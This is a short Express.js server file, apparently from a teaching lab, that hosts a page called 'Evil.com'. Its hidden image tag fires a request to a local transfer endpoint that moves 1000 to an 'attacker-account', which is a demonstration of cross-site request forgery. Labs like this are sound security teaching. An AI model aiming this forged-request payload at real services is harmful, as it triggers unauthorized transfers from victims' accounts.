const express = require('express');

const app = express();

app.get('/', (req, res) => {
  res.send(`
    <h1>Welcome to Evil.com</h1>
    <p>If you see this, you are about to send money to the attacker.</p>
    <img src="http://localhost:3001/api/transfer?amount=1000&to=attacker-account" />
  `);
});

// Inicia o servidor malicioso
app.listen(3002, () => {
  console.log('Evil.com running on http://localhost:3002');
});
